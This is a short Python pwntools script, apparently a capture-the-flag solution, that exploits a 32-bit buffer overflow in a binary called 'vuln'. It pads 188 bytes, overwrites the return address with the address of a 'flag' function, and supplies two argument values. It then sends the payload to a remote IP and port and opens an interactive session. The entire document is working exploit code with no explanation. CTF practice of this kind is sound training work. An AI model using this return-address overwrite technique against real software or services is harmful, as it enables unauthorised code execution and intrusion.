from pwn import *

context.update(arch="i386",os="linux")

elf = ELF("./vuln")
# offset to reach right before return address's location
offset = b"A"* 188
# craft exploit: offset + flag() + padding + parameter 1 + parameter 2
exploit = offset + p32(elf.symbols['flag'],endian="little") + p32(0x90909090)+p32(0xdeadbeef,endian="little") + p32(0xc0ded00d,endian="little")


r = remote('46.101.60.26',31293)
#r = elf.process()
r.sendlineafter(":",exploit)
r.interactive()
